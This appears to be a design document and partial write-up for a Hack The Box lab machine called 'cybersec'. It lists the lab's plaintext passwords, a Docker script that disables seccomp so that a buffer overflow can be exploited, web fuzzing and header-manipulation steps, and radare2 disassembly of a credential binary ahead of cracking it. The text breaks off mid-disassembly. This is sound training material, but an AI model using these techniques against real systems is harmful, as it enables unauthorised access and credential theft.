# cybersec

## Introduction

I created this machine with the intention of highlighting the Bof vulnerability, even when all protections are active, but it is combined with bad configurations as well as the power of reverse engineering and cracking. In addition, I also want to highlight the importance of having critical endpoints that could expose sensitive information well secured.

## Info for HTB

### Access

Passwords:

| User   | Password                            |
| -----  | ----------------------------------- |
| carlos |  deephack009|
| pedro  |  12369874qwertyuiop|
| root   |  pQcp0mvmered11100011pass|

### Key Processes

The web service is set up with Flask, the path to the `.py` file is:

```/root/cybersec/app.py```

The other service present on the machine is `SSH`, which runs with 

```sudo service ssh start```

For the `hall` and `sec2pass` binaries I send the source codes separately.

### Automation / Crons

wrapper of gdb: `/usr/local/bin/secure_gdb`

```bash
#!/bin/bash
# script que le otorga permisos al usuario pedro para que ejecute unica y exclusivamente el binario en su directorio
bin_path="/home/pedro/hallx"
hash="183480399567de77e64a64c571bcfe7ccc0c5f67830300ac8f9b6fa6990bfc26"

if [[ $# -ne 1 ]]; then
    echo "Error: Only one argument is allowed (the path to the binary >> $bin_path)."
    exit 1
fi

if [[ "$1" != $bin_path ]]; then
    echo "Permission denied: You can only debug the binary $bin_path"
    exit 1
fi

validator=$(sha256sum "$1" |awk '{print $1}')

if [[ "$hash" != "$validator" ]]; then
   echo "Modified binary, aborting execution"
   echo "Notifying System Administrator of Event!"
   echo "Binary modification detected $bin_path" >> /root/Events.log
   sleep 2
   echo "Notification Sent"
   exit 1
fi

/usr/bin/gdb -nx -x /root/.gdbinit "$@"
```

Initialization file for `gdb` : `/root/.gdbinit`

```
set confirm off

define shell
  echo "The use of the 'shell' command is disabled."\n
end
```

The `gdb` wrapper is responsible for wrapping gdb to secure its execution with `sudo` and thus, along with the `/root/.gdbinit` configuration file, prevent direct escalation to root without having to exploit the `bof`.


### Firewall Rules

sin rules

### Docker

Dockerfile

```
FROM cybersec:latest

CMD /root/conf.sh & && \
    tail -f /dev/null
```

I have also created a script to automate the execution and subsequent cleaning of the image in the system.

run_cybersec.sh
```bash
#!/bin/bash
# autor: darksblack
# Color
CBL='\033[34m'  # blue
CBLE='\033[36m' # Cyan
BLD='\033[1m'   # Bold type
CNC='\033[0m'   # Reset color
# banner
printf "\t ${CBL}${BLD} \n"
printf "\t       ____      _               ____\n"
printf "\t      / ___|   _| |__   ___ _ __/ ___|  ___  ___\n"
printf "\t     | |  | | | |  _ \ / _ \  __\___ \ / _ \/ __|\n"
printf "\t     | |__| |_| | |_) |  __/ |   ___) |  __/ (__\n"
printf "\t      \____\__, |_.__/ \___|_|  |____/ \___|\___|\n"
printf "\t           |___/\n"
printf "\t ${CNC} \n"

name="cybersec"

stop_del() {

    docker rm -f $name > /dev/null 2>&1 # we remove the docker container
    docker rmi -f $name > /dev/null 2>&1 # We remove the docker image
}


trap ctrl_c SIGINT

function ctrl_c() {
    echo -e "\e[1mDeleting the lab, wait a moment...\e[0m"
    stop_del
    echo -e "\nThe lab has been completely removed from the system."
    exit 0
}

# load the Docker image
docker load -i cybersec.tar > /dev/null

# we run the container
docker run --name $name -d --security-opt seccomp=unconfined --hostname $name -it $name >/dev/null

# --security-opt seccomp=unconfined: It is implemented to be able to make system calls, such as execve, which is necessary to exploit bof.
# Docker containers block this by default

# we extract the IP address of the container.
IP_ADDRESS=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $name)

printf "${CBLE}${BLD}\n"
echo "Machine deployed, its IP address is -->" $IP_ADDRESS
printf "\t ${CNC} \n"

# Wait indefinitely so that the script does not terminate.
while true; do
    sleep 1
done
```
If you are not using the previous script, it is important to run the container with the `--security-opt seccomp=unconfined` parameters, as this is essential for performing the Bof exploitation in the `hall` binary. This is because Docker containers block system calls by default, and the Bof exploitation uses the `execve` system call to invoke a `shell` and thus obtain `root`.




### Other

[Include any other design decisions you made that the HTB staff should know about]



# Writeup

The machine acquisition process begins by analyzing the website where we obtained endpoints. After locating the appropriate endpoint, we need to find a way to access the information it contains, where we will obtain sensitive information such as URLs and UUIDs. Among the subdomains, we find a binary and a note. This binary is still in development, but apparently contains valid credentials, as its purpose appears to be to manage employee credentials. It is through this binary that we gain access to the machine, as it must be hacked to reveal access credentials. Once inside the system, we can read emails between users and the administrator. Through impersonation, we can request privileges from the administrator and thus escalate until we take full control of the system.

# Enumeration

## Enumeration of Ports, Services and Versions

```bash
sudo nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-23 09:18 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 88:00:5f:26:eb:50:e4:55:6d:0a:0c:73:58:99:cd:2d (ECDSA)
|_  256 6b:36:5c:a3:c0:8b:22:b7:35:11:86:f1:7e:7f:77:5b (ED25519)
80/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Did not follow redirect to http://cybersec.htb
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
```

We see that the `SSH` and `HTTP` services are running, so we'll start by checking the web service, but first we must add the domain reported by `nmap` to the `/etc/hosts` file.

```bash
echo "172.17.0.2 cybersec.htb" >> /etc/hosts
```
Now we can consult the web service

![image](https://github.com/user-attachments/assets/d3951830-49b0-47e2-a78e-27984d1931b5)

It seems to be about a cybersecurity company. If we test the contact panel, it has nothing to offer. If we check the source code, we can see some interesting information.

![image](https://github.com/user-attachments/assets/cb06b947-6249-49ce-907f-5b80ee138581)

uses an `api` to generate the secure credentials message, we check 

![image](https://github.com/user-attachments/assets/3e881c99-33e0-4133-804d-72f41ac8ddd7)

I'll see if I can get more endpoints by fuzzing.

```bash
feroxbuster -u http://cybersec.htb/api -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 200 --random-agent --no-state -d 5
```
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cybersec.htb/api
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c http://cybersec.htb/api/interest
[>-------------------] - 20s     9761/207629  7m      found:1       errors:0      
[>-------------------] - 20s     9753/207629  476/s   http://cybersec.htb/api/
```

I get one more end point, so we can test it.

![image](https://github.com/user-attachments/assets/ac679b8c-7294-4cf0-b146-13abe557c1fe)

We see that it tells us "Method not allowed" so it must be `POST` so I try with `curl`

```bash
curl -X POST http://cybersec.htb/api/interest
```
```bash
{
  "message": "Error: 'Role' header not provided"
}
```

We see the error message that the Role header is missing, so after trying different roles I found 2 correct roles: user and administrator

![image](https://github.com/user-attachments/assets/d3c8744d-8dac-4ae2-8149-0c8f106251a7)

One returns basic information and the other more sensitive information and after testing the different subdomains, I get 2 assets.

![image](https://github.com/user-attachments/assets/51d46425-d731-497b-b28a-b25d0ec2271d)

![image](https://github.com/user-attachments/assets/91f60284-40b7-49fd-801a-e46795e86de1)


active URLs: `http://mail.cybersec.htb/` & `http://0internal_down.cybersec.htb/`

After testing the email subdomain, I didn't find any vulnerabilities, so we checked the other active subdomain where we see it indicates a missing header. If we look at the details we see that the header seems to refer to the UUIDs we got in /api/interest. I'm going to test the header with the UUIDs in /api/interest

```bash
curl http://0internal_down.cybersec.htb -H "X-UUID-Access: f47ac10b-58cc-4372-a567-0e02b2c3d479"
```
```html
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cybersec - Sec2Pass</title>
    <link rel="icon" href="http://cybersec.htb/static/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #202343;
            margin: 0;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }

        h1 {
            text-align: center;
            color: #333;
        }

        .file-list {
            margin-top: 20px;
        }

        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #eaeaea;
        }

        .file-item:last-child {
            border-bottom: none;
        }

        .file-name {
            font-weight: bold;
            color: #555;
        }

        .download-btn {
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 8px 12px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .download-btn:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Sec2Pass</h1>
        <div class="file-list">
            <div class="file-item">
                <span class="file-name">sec2pass</span>
                <button class="download-btn" onclick="downloadFile('sec2pass')">Descargar</button>
            </div>

            <div class="file-item">
                <span class="file-name">sec2pass_note.txt</span>
                <button class="download-btn" onclick="downloadFile('sec2pass_note.txt')">Descargar</button>
            </div>




        </div>
    </div>

    <script>
        function downloadFile(fileName) {
                 const link = document.createElement('a');
                 link.href = `http://0internal_down.cybersec.htb/download/${fileName}`;
                 link.download = fileName; 
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
        }
    </script>
    </script>
</body>
</html>
```
Analyzing the code, I see 2 files which I am going to download in the following way

```bash
wget http://0internal_down.cybersec.htb/download/sec2pass_note.txt
```
```bash
wget http://0internal_down.cybersec.htb/download/sec2pass
```

we read the downloaded note

```bash
cat sec2pass_note.txt
```
```bash
At Cybersec we are committed to information security, for this reason we have developed a program so that our associates 
do not have to remember credentials, it is currently in beta phase, so not all credentials are stored yet, but in the 
short term improvements will be included and credentials of more associates will be added... Our program, Sec2Pass, 
has 3 levels of security to protect internal credentials, and to avoid information leakage, the authentication credentials 
to access internal credentials are automatically updated every 24 hours, for this reason it will be mandatory to request the 
primary credentials when arriving at the company where they will be given the first access password as well as an additional 
security ping and in this way, Sec2Pass will provide them with the remote access credentials necessary to perform their functions.
```
The sec2pass program appears to store credentials, but two levels of verification are required to reveal the remote access credentials. Since I don't have the password, I'm going to apply reverse engineering to see if it's possible to extract the information or if it's necessary to crack the binary.

![image](https://github.com/user-attachments/assets/08418788-2008-4149-b9c5-5f915522e7c3)



# Foothold

## Reverse Engineering & cracking

### GHIDRA

I start by opening the program with Ghidra to try to extract information.

```bash
ghidra 
```

![image](https://github.com/user-attachments/assets/680651eb-199c-4bdf-9d0a-197db57adedd)

We load the program and begin its analysis

![image](https://github.com/user-attachments/assets/61321535-3ea9-43e8-8c45-4698c1e24293)

![image](https://github.com/user-attachments/assets/56497bc7-c4d5-41a0-81cb-1cc3f4c739cc)


After an analysis, it is observed that the sensitive information is encrypted with sha256-ecb, trying to decrypt the information is a very complex process and even more so taking into account that the information, as observed, is fragmented, so the strategy that I will use will be to crack the program to bypass the verification system.


### Cracking

To crack the binary we will use `radare2`

```bash
r2 -w sec2pass
```
```bash
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00002150]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x00002150]> s main
[0x00002ccf]> pdf
Do you want to print 366 lines? (y/N) y
            ; ICOD XREF from entry0 @ 0x2164(r)
┌ 1737: int main (int argc, char **argv, char **envp);
│ afv: vars(7:sp[0x10..0x10f8])
│           0x00002ccf      55             push rbp
│           0x00002cd0      4889e5         mov rbp, rsp
│           0x00002cd3      4881ecf010..   sub rsp, 0x10f0
│           0x00002cda      64488b0425..   mov rax, qword fs:[0x28]
│           0x00002ce3      488945f8       mov qword [canary], rax
│           0x00002ce7      31c0           xor eax, eax
│           0x00002ce9      488d95f0ef..   lea rdx, [format]
│           0x00002cf0      b800000000     mov eax, 0
│           0x00002cf5      b980000000     mov ecx, 0x80
│           0x00002cfa      4889d7         mov rdi, rdx
│           0x00002cfd      f348ab         rep stosq qword [rdi], rax
│           0x00002d00      488b150135..   mov rdx, qword [obj.AMLP]   ; [0x6208:8]=0x41dd "ing"
│           0x00002d07      488d85f0ef..   lea rax, [format]
│           0x00002d0e      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d11      4889c7         mov rdi, rax                ; char *s1
│           0x00002d14      e807f4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d19      488b15f034..   mov rdx, qword [obj.PRZS]   ; [0x6210:8]=0x41e1 "res"
│           0x00002d20      488d85f0ef..   lea rax, [format]
│           0x00002d27      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d2a      4889c7         mov rdi, rax                ; char *s1
│           0x00002d2d      e8eef3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d32      488b15df34..   mov rdx, qword [obj.ING]    ; [0x6218:8]=0x4027 ; "'@"
│           0x00002d39      488d85f0ef..   lea rax, [format]
│           0x00002d40      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d43      4889c7         mov rdi, rax                ; char *s1
│           0x00002d46      e8d5f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d4b      488d85f0ef..   lea rax, [format]
│           0x00002d52      4889c7         mov rdi, rax                ; const char *s
│           0x00002d55      e806f3ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002d5a      4889c2         mov rdx, rax
│           0x00002d5d      488d85f0ef..   lea rax, [format]
│           0x00002d64      4801d0         add rax, rdx
│           0x00002d67      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002d6c      488b15ad34..   mov rdx, qword [obj.PROS]   ; [0x6220:8]=0x41e5 "la"
│           0x00002d73      488d85f0ef..   lea rax, [format]
│           0x00002d7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002d80      e89bf3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d85      488d85f0ef..   lea rax, [format]
│           0x00002d8c      4889c7         mov rdi, rax                ; const char *s
│           0x00002d8f      e8ccf2ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002d94      4889c2         mov rdx, rax
│           0x00002d97      488d85f0ef..   lea rax, [format]
│           0x00002d9e      4801d0         add rax, rdx
│           0x00002da1      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002da6      488b157b34..   mov rdx, qword [obj.TANO]   ; [0x6228:8]=0x41e8 "co"
│           0x00002dad      488d85f0ef..   lea rax, [format]
│           0x00002db4      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002db7      4889c7         mov rdi, rax                ; char *s1
│           0x00002dba      e861f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002dbf      488b156a34..   mov rdx, qword [obj.CHZ]    ; [0x6230:8]=0x4029 ; ")@"
│           0x00002dc6      488d85f0ef..   lea rax, [format]
│           0x00002dcd      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002dd0      4889c7         mov rdi, rax                ; char *s1
│           0x00002dd3      e848f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002dd8      488b155934..   mov rdx, qword [obj.PWD]    ; [0x6238:8]=0x41eb "tra"
│           0x00002ddf      488d85f0ef..   lea rax, [format]
│           0x00002de6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002de9      4889c7         mov rdi, rax                ; char *s1
│           0x00002dec      e82ff3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002df1      488b154834..   mov rdx, qword [obj.CLIK]   ; [0x6240:8]=0x41ef "se.."
│           0x00002df8      488d85f0ef..   lea rax, [format]
│           0x00002dff      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e02      4889c7         mov rdi, rax                ; char *s1
│           0x00002e05      e816f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e0a      488b153734..   mov rdx, qword [obj.PARR]   ; [0x6248:8]=0x41f4
│           0x00002e11      488d85f0ef..   lea rax, [format]
│           0x00002e18      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e1b      4889c7         mov rdi, rax                ; char *s1
│           0x00002e1e      e8fdf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e23      488d95f0f3..   lea rdx, [s]
│           0x00002e2a      b800000000     mov eax, 0
│           0x00002e2f      b980000000     mov ecx, 0x80
│           0x00002e34      4889d7         mov rdi, rdx
│           0x00002e37      f348ab         rep stosq qword [rdi], rax
│           0x00002e3a      488b15e733..   mov rdx, qword [obj.TANO]   ; [0x6228:8]=0x41e8 "co"
│           0x00002e41      488d85f0f3..   lea rax, [s]
│           0x00002e48      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e4b      4889c7         mov rdi, rax                ; char *s1
│           0x00002e4e      e8cdf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e53      488b15d633..   mov rdx, qword [obj.CHZ]    ; [0x6230:8]=0x4029 ; ")@"
│           0x00002e5a      488d85f0f3..   lea rax, [s]
│           0x00002e61      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e64      4889c7         mov rdi, rax                ; char *s1
│           0x00002e67      e8b4f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e6c      488b15c533..   mov rdx, qword [obj.PWD]    ; [0x6238:8]=0x41eb "tra"
│           0x00002e73      488d85f0f3..   lea rax, [s]
│           0x00002e7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002e80      e89bf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e85      488b15b433..   mov rdx, qword [obj.CLIK]   ; [0x6240:8]=0x41ef "se.."
│           0x00002e8c      488d85f0f3..   lea rax, [s]
│           0x00002e93      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e96      4889c7         mov rdi, rax                ; char *s1
│           0x00002e99      e882f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e9e      488b151334..   mov rdx, qword [obj.ASMLF]  ; [0x62b8:8]=0x4224 ; "$B"
│           0x00002ea5      488d85f0f3..   lea rax, [s]
│           0x00002eac      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002eaf      4889c7         mov rdi, rax                ; char *s1
│           0x00002eb2      e869f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002eb7      488d85f0f3..   lea rax, [s]
│           0x00002ebe      4889c7         mov rdi, rax                ; const char *s
│           0x00002ec1      e89af1ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002ec6      4889c2         mov rdx, rax
│           0x00002ec9      488d85f0f3..   lea rax, [s]
│           0x00002ed0      4801d0         add rax, rdx
│           0x00002ed3      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002ed8      488b157133..   mov rdx, qword [obj.VNZ]    ; [0x6250:8]=0x41f8
│           0x00002edf      488d85f0f3..   lea rax, [s]
│           0x00002ee6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002ee9      4889c7         mov rdi, rax                ; char *s1
│           0x00002eec      e82ff2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002ef1      488b156033..   mov rdx, qword [obj.HK]     ; [0x6258:8]=0x41fa str.ncor
│           0x00002ef8      488d85f0f3..   lea rax, [s]
│           0x00002eff      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f02      4889c7         mov rdi, rax                ; char *s1
│           0x00002f05      e816f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f0a      488b154f33..   mov rdx, qword [obj.EEUU]   ; [0x6260:8]=0x41ff "re"
│           0x00002f11      488d85f0f3..   lea rax, [s]
│           0x00002f18      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f1b      4889c7         mov rdi, rax                ; char *s1
│           0x00002f1e      e8fdf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f23      488b153e33..   mov rdx, qword [obj.DNMC]   ; [0x6268:8]=0x4202 "cta"
│           0x00002f2a      488d85f0f3..   lea rax, [s]
│           0x00002f31      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f34      4889c7         mov rdi, rax                ; char *s1
│           0x00002f37      e8e4f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f3c      488b156533..   mov rdx, qword [obj.ERTG]   ; [0x62a8:8]=0x4220 ; " B"
│           0x00002f43      488d85f0f3..   lea rax, [s]
│           0x00002f4a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f4d      4889c7         mov rdi, rax                ; char *s1
│           0x00002f50      e8cbf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f55      488d95f0f7..   lea rdx, [var_810h]
│           0x00002f5c      b800000000     mov eax, 0
│           0x00002f61      b980000000     mov ecx, 0x80
│           0x00002f66      4889d7         mov rdi, rdx
│           0x00002f69      f348ab         rep stosq qword [rdi], rax
│           0x00002f6c      488b159532..   mov rdx, qword [obj.AMLP]   ; [0x6208:8]=0x41dd "ing"
│           0x00002f73      488d85f0f7..   lea rax, [var_810h]
│           0x00002f7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002f80      e89bf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f85      488b158432..   mov rdx, qword [obj.PRZS]   ; [0x6210:8]=0x41e1 "res"
│           0x00002f8c      488d85f0f7..   lea rax, [var_810h]
│           0x00002f93      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f96      4889c7         mov rdi, rax                ; char *s1
│           0x00002f99      e882f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f9e      488b157332..   mov rdx, qword [obj.ING]    ; [0x6218:8]=0x4027 ; "'@"
│           0x00002fa5      488d85f0f7..   lea rax, [var_810h]
│           0x00002fac      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002faf      4889c7         mov rdi, rax                ; char *s1
│           0x00002fb2      e869f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002fb7      488d85f0f7..   lea rax, [var_810h]
│           0x00002fbe      4889c7         mov rdi, rax                ; const char *s
│           0x00002fc1      e89af0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002fc6      4889c2         mov rdx, rax
│           0x00002fc9      488d85f0f7..   lea rax, [var_810h]
│           0x00002fd0      4801d0         add rax, rdx
│           0x00002fd3      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002fd8      488b15e132..   mov rdx, qword [obj.ASMQ]   ; [0x62c0:8]=0x4226 "el" ; "&B"
│           0x00002fdf      488d85f0f7..   lea rax, [var_810h]
│           0x00002fe6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002fe9      4889c7         mov rdi, rax                ; char *s1
│           0x00002fec      e82ff1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002ff1      488d85f0f7..   lea rax, [var_810h]
│           0x00002ff8      4889c7         mov rdi, rax                ; const char *s
│           0x00002ffb      e860f0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003000      4889c2         mov rdx, rax
│           0x00003003      488d85f0f7..   lea rax, [var_810h]
│           0x0000300a      4801d0         add rax, rdx
│           0x0000300d      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003012      488b155732..   mov rdx, qword [obj.NRG]    ; [0x6270:8]=0x4206 "cod"
│           0x00003019      488d85f0f7..   lea rax, [var_810h]
│           0x00003020      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003023      4889c7         mov rdi, rax                ; char *s1
│           0x00003026      e8f5f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000302b      488b154632..   mov rdx, qword [obj.BRZL]   ; [0x6278:8]=0x420a "igo" ; "\nB"
│           0x00003032      488d85f0f7..   lea rax, [var_810h]
│           0x00003039      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000303c      4889c7         mov rdi, rax                ; char *s1
│           0x0000303f      e8dcf0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003044      488d85f0f7..   lea rax, [var_810h]
│           0x0000304b      4889c7         mov rdi, rax                ; const char *s
│           0x0000304e      e80df0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003053      4889c2         mov rdx, rax
│           0x00003056      488d85f0f7..   lea rax, [var_810h]
│           0x0000305d      4801d0         add rax, rdx
│           0x00003060      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003065      488b151432..   mov rdx, qword [obj.LAKDF]  ; [0x6280:8]=0x420e "de"
│           0x0000306c      488d85f0f7..   lea rax, [var_810h]
│           0x00003073      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003076      4889c7         mov rdi, rax                ; char *s1
│           0x00003079      e8a2f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000307e      488d85f0f7..   lea rax, [var_810h]
│           0x00003085      4889c7         mov rdi, rax                ; const char *s
│           0x00003088      e8d3efffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0000308d      4889c2         mov rdx, rax
│           0x00003090      488d85f0f7..   lea rax, [var_810h]
│           0x00003097      4801d0         add rax, rdx
│           0x0000309a      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x0000309f      488b15e231..   mov rdx, qword [obj.WVWVEB] ; [0x6288:8]=0x4211 "seg"
│           0x000030a6      488d85f0f7..   lea rax, [var_810h]
│           0x000030ad      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030b0      4889c7         mov rdi, rax                ; char *s1
│           0x000030b3      e868f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030b8      488b15d131..   mov rdx, qword [obj.RBWRTB] ; [0x6290:8]=0x4215 "uri"
│           0x000030bf      488d85f0f7..   lea rax, [var_810h]
│           0x000030c6      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030c9      4889c7         mov rdi, rax                ; char *s1
│           0x000030cc      e84ff0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030d1      488b15c031..   mov rdx, qword [obj.AEBDV]  ; [0x6298:8]=0x4219 "dad"
│           0x000030d8      488d85f0f7..   lea rax, [var_810h]
│           0x000030df      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030e2      4889c7         mov rdi, rax                ; char *s1
│           0x000030e5      e836f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030ea      488b15af31..   mov rdx, qword [obj.QQQQ]   ; [0x62a0:8]=0x421d
│           0x000030f1      488d85f0f7..   lea rax, [var_810h]
│           0x000030f8      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030fb      4889c7         mov rdi, rax                ; char *s1
│           0x000030fe      e81df0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003103      488d95f0fb..   lea rdx, [var_410h]
│           0x0000310a      b800000000     mov eax, 0
│           0x0000310f      b980000000     mov ecx, 0x80
│           0x00003114      4889d7         mov rdi, rdx
│           0x00003117      f348ab         rep stosq qword [rdi], rax
│           0x0000311a      488b154f31..   mov rdx, qword [obj.NRG]    ; [0x6270:8]=0x4206 "cod"
│           0x00003121      488d85f0fb..   lea rax, [var_410h]
│           0x00003128      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000312b      4889c7         mov rdi, rax                ; char *s1
│           0x0000312e      e8edefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003133      488b153e31..   mov rdx, qword [obj.BRZL]   ; [0x6278:8]=0x420a "igo" ; "\nB"
│           0x0000313a      488d85f0fb..   lea rax, [var_410h]
│           0x00003141      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003144      4889c7         mov rdi, rax                ; char *s1
│           0x00003147      e8d4efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000314c      488d85f0fb..   lea rax, [var_410h]
│           0x00003153      4889c7         mov rdi, rax                ; const char *s
│           0x00003156      e805efffff     call sym.imp.strlen         ; size_t strlen(const char *s)
